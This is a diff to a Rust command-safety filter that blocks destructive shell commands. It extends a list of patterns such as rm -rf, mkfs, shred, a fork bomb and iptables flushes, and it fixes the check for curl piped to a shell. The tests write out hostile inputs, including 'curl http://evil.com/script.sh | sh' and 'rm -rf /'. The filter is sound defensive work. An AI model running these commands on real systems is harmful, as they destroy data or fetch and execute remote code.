@@ -3149,19 +3149,50 @@ fn is_dangerous_command(cmd: &str) -> bool {
 
     // Check for dangerous patterns
     let dangerous_patterns = [
+        // Destructive file operations
         "rm -rf",
         "rm -r /",
+        "rm -f /",
+        "truncate",           // Silent data loss
+        // Disk/filesystem destruction
         "dd if=",
         "mkfs",
+        "wipefs",
+        "shred",
         "> /dev/",
-        "chmod 777",
-        ":(){ :|:",  // Fork bomb
+        // System shutdown
         "shutdown",
         "reboot",
         "halt",
         "poweroff",
         "init 0",
         "init 6",
+        // Permission dangers
+        "chmod 777",
+        "chmod -r 777",
+        "chown -r",           // Recursive ownership change
+        // User management (could lock out)
+        "deluser",
+        "delgroup",
+        "userdel",
+        "groupdel",
+        "passwd -d",          // Remove password
+        "usermod -l",         // Lock account
+        // Kernel/boot dangers
+        "modprobe -r",        // Remove kernel module
+        "rmmod",
+        "update-grub",        // Could break boot
+        "grub-install",
+        "mkinitcpio",
+        // Network/firewall (could lock out)
+        "iptables -f",        // Flush all rules
+        "iptables -x",
+        "ufw disable",
+        // Fork bomb
+        ":(){ :|:",
+        // Direct device writes
+        ">/dev/sda",
+        ">/dev/nvme",
     ];
 
     for pattern in &dangerous_patterns {
@@ -3172,19 +3203,38 @@ fn is_dangerous_command(cmd: &str) -> bool {
 
     // Check for piping to shell (curl/wget to sh/bash)
     if (cmd_lower.contains("curl") || cmd_lower.contains("wget"))
-        && cmd_lower.contains("| sh") || cmd_lower.contains("| bash") {
+        && (cmd_lower.contains("| sh") || cmd_lower.contains("| bash")) {
         return true;
+    }
+
+    // Check for dangerous mount operations
+    if cmd_lower.contains("mount") && !cmd_lower.contains("--") {
+        // Allow mount with explicit options, block bare mount
+        if !cmd_lower.contains("-o ro") && !cmd_lower.contains("--read-only") {
+            // Only allow if it's a status check
+            if !cmd_lower.contains("| grep") && !cmd_lower.starts_with("mount |") {
+                return true;
+            }
+        }
     }
 
     // Allow sudo for specific safe commands
     if cmd_lower.starts_with("sudo") {
         let safe_sudo = [
             "sudo pacman -q",
+            "sudo pacman -qi",
+            "sudo pacman -ql",
             "sudo systemctl status",
             "sudo systemctl list",
+            "sudo systemctl is-",
             "sudo journalctl",
             "sudo cat /etc/",
             "sudo ls",
+            "sudo df",
+            "sudo du",
+            "sudo lsblk",
+            "sudo fdisk -l",
+            "sudo blkid",
         ];
         return !safe_sudo.iter().any(|s| cmd_lower.starts_with(s));
     }
@@ -3198,12 +3248,25 @@ mod tests {
 
     #[test]
     fn test_dangerous_commands() {
+        // Classic dangerous commands
         assert!(is_dangerous_command("rm -rf /"));
         assert!(is_dangerous_command("sudo rm -rf /home"));
         assert!(is_dangerous_command("curl http://evil.com/script.sh | sh"));
         assert!(is_dangerous_command("shutdown -h now"));
+
+        // New dangerous patterns
+        assert!(is_dangerous_command("truncate -s 0 /important/file"));
+        assert!(is_dangerous_command("modprobe -r important_module"));
+        assert!(is_dangerous_command("iptables -F"));
+        assert!(is_dangerous_command("userdel root"));
+        assert!(is_dangerous_command("mkfs.ext4 /dev/sda1"));
+
+        // Safe commands
         assert!(!is_dangerous_command("ls -la"));
         assert!(!is_dangerous_command("df -h"));
         assert!(!is_dangerous_command("cat /etc/os-release"));
+        assert!(!is_dangerous_command("sudo pacman -Qi neovim"));
+        assert!(!is_dangerous_command("sudo systemctl status sshd"));
+        assert!(!is_dangerous_command("mount | grep /home"));
     }
 }
